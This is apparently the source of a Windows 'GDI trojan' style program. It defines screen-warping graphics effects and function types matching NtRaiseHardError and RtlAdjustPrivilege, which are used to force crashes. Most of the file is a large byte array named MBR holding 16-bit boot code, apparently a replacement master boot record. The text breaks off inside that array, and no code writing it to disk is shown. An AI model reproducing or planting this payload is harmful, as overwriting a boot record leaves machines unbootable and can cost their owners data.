typedef struct IUnknown IUnknown;
#ifndef UNICODE
#define UNICODE
#endif

#define NOMINMAX
#include <windows.h>
#include <math.h>
#include <cstdint>
#include <windowsx.h>
#include <cstdlib>
#include <tchar.h>
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "winmm.lib")
#pragma warning(disable : 4996)
#define MIN(a,b) (((a)<(b))?(a):(b))
#define MAX(a,b) (((a)>(b))?(a):(b))
#include <stdint.h>
#include <string>
#include <random>
#include <time.h>
#include <algorithm>
#include <stdlib.h>
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
#define PI 3.141592653
#define RANDRGB (COLORREF)RGB(rand()%255, rand()%165, rand()%1)
int ShiftR = 3;
int ShiftG = 0;
int ShiftB = 2;
int boyR = 3;
int boyG = 0;
int boyB = 2;
int hiR = 3;
int hiG = 1;
int hiB = 2;
int ShiftSpeed = 13;
int ShiftSpeed2 = 32;
int ShiftSpeed3 = 750;
int ShiftSpeed4 = 450;
int ShiftSpeed5 = 4;
int WarpSpeed = 15;
int WarpSpeed2 = 15;
#define TIMER_ID 1
#define CIRCLE_COUNT 32
HINSTANCE hInst;
HWND hWndMain;
POINT circles[CIRCLE_COUNT];
int radius = 80;
#pragma region Public Variables
extern HWND hwndDesktop;
extern HDC hdcDesktop;
extern RECT rcScrBounds;
extern HHOOK hMsgHook;
extern INT nCounter;
int gw, gh;

HDC gScreenDC;
HDC gMemDC;
HDC gTempDC;
HDC gRotDC;

HBITMAP gMemBmp;
HBITMAP gTempBmp;
HBITMAP gRotBmp;

void* gMemBits;
void* gTempBits;
void* gRotBits;

float gAngle = 0.0f;
float gDir = 0.001f;
BLENDFUNCTION blendLayer = { AC_SRC_OVER,0,255,AC_SRC_ALPHA };
BLENDFUNCTION blendShake = { AC_SRC_OVER,0,191,0 };
#define MajorHardwareReason       0x00010000
#define MinorPSUReason   0x0000000A
#pragma endregion Public Variables

typedef struct {
    float h, s, l;
} HSL;

typedef struct {
    BYTE b, g, r, unused;
} RGB_PIXEL;

void WINAPI ShaderC(int t, int w, int h, RGB_PIXEL* src, RGB_PIXEL* dst) {
    for (int y = 0; y < h; y++) {
        for (int x = 0; x < w; x++) {
            int idx = y * w + x;

            //note you put F before channel names for example Fx and Rx are 2 diff things mane.
            float fx = x + sin(y * 0.02f + t * 0.02f) * 30;
            float fy = y + sin(x * 0.02f + t * 0.02f) * 30;

            int rx = ((int)fx % w + w) % w;
            int ry = ((int)fy % h + h) % h;
            dst[idx].r = src[ry * w + rx].r;

            float fgx = x + cos(y * 0.02f + t * 0.02f) * 30;
            float fgy = y + cos(x * 0.02f + t * 0.02f) * 30;

            int gx = ((int)fgx % w + w) % w;
            int gy = ((int)fgy % h + h) % h;
            dst[idx].g = src[gy * w + gx].g;

            float fbx = x + tan(y * 0.02f + t * 0.02f) * 30;
            float fby = y + tan(x * 0.02f + t * 0.02f) * 30;

            int bx = ((int)fbx % w + w) % w;
            int by = ((int)fby % h + h) % h;
            dst[idx].g = src[by * w + bx].b;
        }
    }
}

const unsigned char MBR[]{ 0xEB, 0x0B, 0x4E, 0x34, 0x24, 0x4D, 0x34, 0x52, 0x33, 0x53, 0x31, 0x47, 0x4E, 0x31, 0xC0, 0x8E,
0xD8, 0x8E, 0xD0, 0xBC, 0x00, 0x9C, 0xFC, 0xE8, 0xCD, 0x01, 0xBB, 0xE8, 0x7C, 0xE8, 0xDF, 0x00,
0xBB, 0x84, 0x7C, 0xB4, 0x07, 0xE8, 0xD7, 0x00, 0xBB, 0xBF, 0x7C, 0xE8, 0xD1, 0x00, 0xBB, 0xE5,
0x7C, 0xE8, 0xCB, 0x00, 0xBB, 0x9E, 0x7C, 0xE8, 0xC5, 0x00, 0x31, 0xD2, 0x6A, 0x00, 0x07, 0xB8,
0x02, 0x02, 0xBB, 0x00, 0x7E, 0xB9, 0x02, 0x00, 0xCD, 0x13, 0x81, 0x7F, 0x02, 0x53, 0x53, 0x74,
0x0B, 0x81, 0xFA, 0xFF, 0x00, 0x74, 0x23, 0x83, 0xC2, 0x01, 0xEB, 0xE3, 0x81, 0x7F, 0x04, 0x42,
0x4C, 0x74, 0x05, 0x83, 0xC2, 0x01, 0xEB, 0xD7, 0x60, 0xB4, 0x07, 0xBB, 0xBF, 0x7C, 0xE8, 0x8E,
0x00, 0xBB, 0xE5, 0x7C, 0xE8, 0x88, 0x00, 0x61, 0xFF, 0xE3, 0xB4, 0x07, 0xBB, 0xD2, 0x7C, 0xE8,
0x7D, 0x00, 0xEB, 0xFE, 0x5C, 0x74, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x75, 0x70,
0x20, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x73, 0x2E, 0x2E, 0x2E, 0x00, 0x5C, 0x74,
0x53, 0x65, 0x61, 0x72, 0x63, 0x68, 0x69, 0x6E, 0x67, 0x20, 0x73, 0x65, 0x63, 0x6F, 0x6E, 0x64,
0x20, 0x62, 0x6F, 0x6F, 0x74, 0x6C, 0x6F, 0x61, 0x64, 0x65, 0x72, 0x2E, 0x2E, 0x2E, 0x00, 0x5C,
0x63, 0x61, 0x68, 0x5B, 0x5C, 0x63, 0x61, 0x63, 0x44, 0x4F, 0x4E, 0x45, 0x5C, 0x63, 0x61, 0x68,
0x5D, 0x00, 0x5C, 0x63, 0x61, 0x68, 0x5B, 0x5C, 0x63, 0x61, 0x65, 0x46, 0x41, 0x49, 0x4C, 0x5C,
0x63, 0x61, 0x68, 0x5D, 0x00, 0x0A, 0x0D, 0x00, 0x5C, 0x63, 0x61, 0x6F, 0x49, 0x6E, 0x69, 0x74,
0x69, 0x61, 0x6C, 0x20, 0x73, 0x65, 0x74, 0x75, 0x70, 0x2E, 0x2E, 0x2E, 0x0A, 0x0D, 0x00, 0x60,
0x60, 0x80, 0x3F, 0x00, 0x0F, 0x84, 0xDC, 0x00, 0x81, 0x3F, 0x5C, 0x30, 0x0F, 0x84, 0xD4, 0x00,
0x80, 0x3F, 0x0A, 0x74, 0x59, 0x80, 0x3F, 0x0D, 0x74, 0x5D, 0x81, 0x3F, 0x5C, 0x6E, 0x74, 0x60,
0x81, 0x3F, 0x5C, 0x72, 0x74, 0x66, 0x81, 0x3F, 0x5C, 0x62, 0x74, 0x6C, 0x81, 0x3F, 0x5C, 0x74,
0x74, 0x7A, 0x81, 0x3F, 0x5C, 0x63, 0x0F, 0x84, 0x84, 0x00, 0x81, 0x3F, 0x5C, 0x24, 0x0F, 0x84,
0x9B, 0x00, 0x61, 0x50, 0x53, 0xB4, 0x0F, 0xCD, 0x10, 0x88, 0xFE, 0x5B, 0x58, 0x60, 0x8A, 0x07,
0x88, 0xF7, 0x88, 0xE3, 0xB4, 0x09, 0xB9, 0x01, 0x00, 0xCD, 0x10, 0x61, 0x60, 0x88, 0xF0, 0x88,
0xC7, 0xB4, 0x03, 0xCD, 0x10, 0x42, 0xFE, 0xCC, 0xCD, 0x10, 0x61, 0x43, 0xEB, 0x92, 0xB8, 0x0A,
0x0E, 0xCD, 0x10, 0x61, 0x43, 0xEB, 0x89, 0xB8, 0x0D, 0x0E, 0xCD, 0x10, 0x61, 0x43, 0xEB, 0x80,
0xB8, 0x0A, 0x0E, 0xCD, 0x10, 0x61, 0x83, 0xC3, 0x02, 0xE9, 0x74, 0xFF, 0xB8, 0x0D, 0x0E, 0xCD,
0x10, 0x61, 0x83, 0xC3, 0x02, 0xE9, 0x68, 0xFF, 0xB4, 0x0F, 0xCD, 0x10, 0xB4, 0x03, 0xCD, 0x10,
0xFE, 0xCC, 0x4A, 0xCD, 0x10, 0x61, 0x83, 0xC3, 0x02, 0xE9, 0x54, 0xFF, 0xB8, 0x20, 0x0E, 0xCD,
0x10, 0xCD, 0x10, 0xCD, 0x10, 0xCD, 0x10, 0x61, 0x83, 0xC3, 0x02, 0xE9, 0x42, 0xFF, 0x61, 0x83,
0xC3, 0x02, 0x8A, 0x07, 0x24, 0x5F, 0x2C, 0x41, 0xB5, 0x10, 0xF6, 0xE5, 0x43, 0x8A, 0x2F, 0x80,
0xE5, 0x5F, 0x80, 0xED, 0x41, 0x00, 0xE8, 0x88, 0xC4, 0x43, 0xE9, 0x23, 0xFF, 0x61, 0x83, 0xC3,
0x02, 0xE9, 0x1C, 0xFF, 0x61, 0x61, 0xC3, 0x60, 0xB8, 0x03, 0x00, 0xCD, 0x10, 0x61, 0xC3, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA,
0xEB, 0x02, 0x53, 0x53, 0x42, 0x4C, 0xE9, 0x83, 0x01, 0x5C, 0x63, 0x61, 0x68, 0x5B, 0x5C, 0x63,
0x61, 0x63, 0x53, 0x55, 0x50, 0x50, 0x4F, 0x52, 0x54, 0x45, 0x44, 0x5C, 0x63, 0x61, 0x68, 0x5D,
0x5C, 0x30, 0x5C, 0x63, 0x61, 0x68, 0x5B, 0x5C, 0x63, 0x61, 0x65, 0x55, 0x4E, 0x53, 0x55, 0x50,
0x50, 0x4F, 0x52, 0x54, 0x45, 0x44, 0x5C, 0x63, 0x61, 0x68, 0x5D, 0x5C, 0x30, 0x5C, 0x63, 0x61,
0x6C, 0x53, 0x65, 0x63, 0x6F, 0x6E, 0x64, 0x61, 0x72, 0x79, 0x20, 0x73, 0x65, 0x74, 0x75, 0x70,
0x2E, 0x2E, 0x2E, 0x5C, 0x72, 0x5C, 0x6E, 0x5C, 0x30, 0x5C, 0x74, 0x43, 0x68, 0x65, 0x63, 0x6B,
0x69, 0x6E, 0x67, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x74, 0x68, 0x65, 0x20, 0x65, 0x78, 0x69, 0x73,
0x74, 0x65, 0x6E, 0x63, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x61, 0x6E, 0x20, 0x69, 0x6E, 0x74, 0x20,
0x30, 0x78, 0x31, 0x35, 0x2E, 0x2E, 0x2E, 0x5C, 0x30, 0x5C, 0x74, 0x47, 0x65, 0x74, 0x74, 0x69,
0x6E, 0x67, 0x20, 0x41, 0x32, 0x30, 0x20, 0x4C, 0x69, 0x6E, 0x65, 0x20, 0x53, 0x74, 0x61, 0x74,
0x75, 0x73, 0x2E, 0x2E, 0x2E, 0x5C, 0x30, 0x5C, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x20, 0x41, 0x32,
0x30, 0x20, 0x69, 0x73, 0x20, 0x61, 0x6C, 0x72, 0x65, 0x61, 0x64, 0x79, 0x20, 0x65, 0x6E, 0x61,
0x62, 0x6C, 0x65, 0x64, 0x2E, 0x2E, 0x2E, 0x5C, 0x30, 0x5C, 0x74, 0x53, 0x77, 0x69, 0x74, 0x63,
0x68, 0x69, 0x6E, 0x67, 0x20, 0x6F, 0x6E, 0x20, 0x74, 0x68, 0x65, 0x20, 0x41, 0x32, 0x30, 0x20,
0x6C, 0x69, 0x6E, 0x65, 0x2E, 0x2E, 0x2E, 0x5C, 0x30, 0x5C, 0x74, 0x53, 0x77, 0x69, 0x74, 0x63,
0x68, 0x69, 0x6E, 0x67, 0x20, 0x66, 0x72, 0x6F, 0x6D, 0x20, 0x52, 0x65, 0x61, 0x6C, 0x20, 0x4D,
0x6F, 0x64, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x55, 0x6E, 0x72, 0x65, 0x61, 0x6C, 0x20, 0x4D, 0x6F,
0x64, 0x65, 0x2E, 0x2E, 0x2E, 0x5C, 0x30, 0x5C, 0x74, 0x4C, 0x6F, 0x61, 0x64, 0x69, 0x6E, 0x67,
0x20, 0x74, 0x68, 0x65, 0x20, 0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x20, 0x69, 0x6E, 0x74, 0x6F,
0x20, 0x6D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x2E, 0x2E, 0x2E, 0x5C, 0x30, 0x5C, 0x74, 0x5C, 0x63,
0x69, 0x6A, 0x4C, 0x61, 0x73, 0x74, 0x20, 0x61, 0x74, 0x74, 0x65, 0x6D, 0x70, 0x74, 0x20, 0x74,
0x6F, 0x20, 0x74, 0x75, 0x72, 0x6E, 0x20, 0x6F, 0x6E, 0x20, 0x41, 0x32, 0x30, 0x20, 0x6C, 0x69,
0x6E, 0x65, 0x2E, 0x2E, 0x2E, 0x5C, 0x30, 0x5C, 0x63, 0x61, 0x68, 0x5B, 0x5C, 0x63, 0x61, 0x63,
0x59, 0x45, 0x53, 0x5C, 0x63, 0x61, 0x68, 0x5D, 0x5C, 0x30, 0x5C, 0x63, 0x61, 0x68, 0x5B, 0x5C,
0x63, 0x61, 0x6E, 0x4E, 0x4F, 0x5C, 0x63, 0x61, 0x68, 0x5D, 0x5C, 0x30, 0xBB, 0x3D, 0x7E, 0xB4,
0x07, 0xE8, 0x6B, 0xFD, 0xBB, 0x59, 0x7E, 0xE8, 0x65, 0xFD, 0xB8, 0x03, 0x24, 0xCD, 0x15, 0x72,
0x73, 0x80, 0xFC, 0x00, 0x75, 0x6E, 0x60, 0xB4, 0x07, 0xBB, 0xBF, 0x7C, 0xE8, 0x50, 0xFD, 0xBB,
0xE5, 0x7C, 0xE8, 0x4A, 0xFD, 0xBB, 0x89, 0x7E, 0xE8, 0x44, 0xFD, 0x61, 0xB8, 0x02, 0x24, 0xCD,
0x15, 0x72, 0x73, 0x80, 0xFC, 0x00, 0x75, 0x6E, 0x60, 0xB4, 0x07, 0xBB, 0xBF, 0x7C, 0xE8, 0x2E,
0xFD, 0xBB, 0xE5, 0x7C, 0xE8, 0x28, 0xFD, 0xBB, 0xA7, 0x7E, 0xE8, 0x22, 0xFD, 0x61, 0x3C, 0x01,
0x74, 0x5E, 0x60, 0xB4, 0x07, 0xBB, 0x7A, 0x7F, 0xE8, 0x14, 0xFD, 0xBB, 0xE5, 0x7C, 0xE8, 0x0E,
0xFD, 0xBB, 0xC9, 0x7E, 0xE8, 0x08, 0xFD, 0x61, 0xB8, 0x01, 0x24, 0xCD, 0x15, 0x72, 0x37, 0x80,
0xFC, 0x00, 0x75, 0x32, 0xB4, 0x07, 0xBB, 0xBF, 0x7C, 0xE8, 0xF3, 0xFC, 0xBB, 0xE5, 0x7C, 0xE8,
0xED, 0xFC, 0xEB, 0x3C, 0xB4, 0x07, 0xBB, 0x22, 0x7E, 0xE8, 0xE3, 0xFC, 0xBB, 0xE5, 0x7C, 0xE8,
0xDD, 0xFC, 0xBB, 0x3C, 0x7F, 0xE8, 0xD7, 0xFC, 0xE4, 0x92, 0x0C, 0x02, 0xE6, 0x92, 0xBB, 0xBF,
0x7C, 0xE8, 0xCB, 0xFC, 0xEB, 0x1A, 0xB4, 0x07, 0xBB, 0xD2, 0x7C, 0xE8, 0xC1, 0xFC, 0xEB, 0xFE,
0x60, 0xB4, 0x07, 0xBB, 0x67, 0x7F, 0xE8, 0xB6, 0xFC, 0xBB, 0xE5, 0x7C, 0xE8, 0xB0, 0xFC, 0x61,
0xBB, 0xE9, 0x7E, 0xB4, 0x07, 0xE8, 0xA7, 0xFC, 0xFA, 0x1E, 0x0F, 0x01, 0x16, 0xEA, 0x80, 0x0F,
0x20, 0xC0, 0x0C, 0x01, 0x0F, 0x22, 0xC0, 0xEA, 0x6C, 0x80, 0x08, 0x00, 0xBB, 0x10, 0x00, 0x8E,
0xDB, 0x24, 0xFE, 0x0F, 0x22, 0xC0, 0xEA, 0x7B, 0x80, 0x00, 0x00, 0x1F, 0xFB, 0xBB, 0xBF, 0x7C,
0xE8, 0x7C, 0xFC, 0xBB, 0xE5, 0x7C, 0xE8, 0x76, 0xFC, 0xBB, 0x17, 0x7F, 0xB4, 0x07, 0xE8, 0x6E,
0xFC, 0x6A, 0x00, 0x07, 0xB8, 0x01, 0x02, 0xBB, 0x00, 0x82, 0xB9, 0x04, 0x00, 0xBA, 0x80, 0x00,
0x31, 0xD2, 0x6A, 0x00, 0x07, 0xB8, 0x01, 0x02, 0xBB, 0x00, 0x82, 0xB9, 0x04, 0x00, 0xCD, 0x13,
0x81, 0x7F, 0x02, 0x4B, 0x52, 0x74, 0x0B, 0x81, 0xFA, 0xFF, 0x00, 0x74, 0x23, 0x83, 0xC2, 0x01,
0xEB, 0xE3, 0x81, 0x7F, 0x04, 0x4E, 0x4C, 0x74, 0x05, 0x83, 0xC2, 0x01, 0xEB, 0xD7, 0x60, 0xB4,
0x07, 0xBB, 0xBF, 0x7C, 0xE8, 0x28, 0xFC, 0xBB, 0xE5, 0x7C, 0xE8, 0x22, 0xFC, 0x61, 0xFF, 0xE3,
0xB4, 0x07, 0xBB, 0xD2, 0x7C, 0xE8, 0x17, 0xFC, 0xEB, 0xFE, 0x17, 0x00, 0xF0, 0x80, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x9A, 0x8F, 0x00,
0xFF, 0xFF, 0x00, 0x00, 0x00, 0x92, 0xCF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xEB, 0x04, 0x4B, 0x52, 0x4E, 0x4C, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x3F, 0x02, 0xBB, 0x00,
0xA6, 0x6A, 0x00, 0x07, 0xB9, 0x05, 0x00, 0xBA, 0x80, 0x00, 0xCD, 0x13, 0xB8, 0x3F, 0x02, 0x31,
0xDB, 0x68, 0x40, 0x12, 0x07, 0xB9, 0x05, 0x00, 0xBA, 0x80, 0x01, 0xCD, 0x13, 0xB8, 0x01, 0x02,
0x31, 0xDB, 0x68, 0x20, 0x1A, 0x07, 0xB9, 0x04, 0x00, 0xBA, 0x80, 0x02, 0xCD, 0x13, 0xBB, 0x00,
0xA6, 0x66, 0x31, 0xC0, 0x8A, 0x27, 0x43, 0x8A, 0x07, 0x43, 0x8A, 0x2F, 0xB1, 0x00, 0x31, 0xDB,
0x66, 0xBA, 0x03, 0xA6, 0x00, 0x00, 0x66, 0xBE, 0x00, 0x00, 0x0A, 0x00, 0x50, 0x67, 0x8A, 0x22,
0x67, 0x88, 0x26, 0x58, 0x66, 0x83, 0xC2, 0x01, 0x66, 0x83, 0xC6, 0x01, 0x83, 0xC3, 0x01, 0x39,
0xC3, 0x7C, 0xE9, 0x66, 0x50, 0x66, 0xB8, 0x40, 0x01, 0x00, 0x00, 0x66, 0x29, 0xD8, 0x66, 0x01,
0xC6, 0x66, 0x58, 0x31, 0xDB, 0x38, 0xE9, 0x74, 0x04, 0xFE, 0xC1, 0xEB, 0xCF, 0xEB, 0xFE, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x01, 0x40, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
